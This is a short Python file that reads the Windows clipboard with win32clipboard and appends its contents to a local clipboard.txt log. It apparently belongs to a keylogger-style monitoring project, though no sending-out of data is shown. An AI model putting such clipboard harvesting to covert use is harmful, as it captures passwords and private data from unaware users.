import win32clipboard

file_path = "C:\\Users\\PC-Service\\OneDrive\\Desktop\\project\\files\\"
extend = "\\"
clipboard_information = "clipboard.txt"

def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard cannot be copied\n")